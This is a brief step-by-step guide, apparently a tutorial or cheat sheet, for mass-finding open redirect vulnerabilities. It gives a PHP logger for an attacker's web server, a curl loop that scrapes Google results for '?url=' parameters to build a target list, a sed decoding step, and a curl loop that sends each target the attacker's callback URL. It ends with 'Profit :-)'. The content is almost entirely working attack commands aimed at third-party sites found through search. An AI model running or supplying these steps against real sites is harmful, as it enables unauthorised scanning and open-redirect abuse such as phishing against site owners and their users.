Step 1: 
On a public web server, create a php file that 
grabs the caller get variable out of the url 
and saves it to a file 

```
<?php
    $caller = $_GET['caller']."\n";

    $fp = fopen('opr.txt','a');
    fwrite($fp,$caller);
?>
```

Step 2: 
On your attacking machine, run this search to get google dorks for /?url=

`for (( x = 1; x < 100; x++)); do a=$((x*10)); curl --connect-timeout 5 -A "Mozilla/4.0" -skLm 10 'https://www.google.com/search?start='"$a"'&tbs=li:1&q=inurl%3A%2F%3Furl%3Dhttp' | grep -o -P "\/url\?q=.+?&amp" | grep -o -P ".*(?<=url=)|.*(?<=%3Furl%3D)" | cut -d "=" -f2; sleep 5 >> targets ; done`

Step 3:
Replace the URL encodings

`sed -e 's/%3F/?/g' -e 's/%3D/=/g' targets > decoded`

Step 4: 
On your attacking machine, attempt to call your target list 

`for target in $(cat decoded); do curl --HEAD --max-redirs 3 --connect-timeout 2 -L --ignore $target"https://yourwebserver.com/openredirectchecker.php?caller=$target\n" ;done`

Step 5:
On your web server tail your output file

`tail -f opr.txt`

Step 6:

Profit :-)

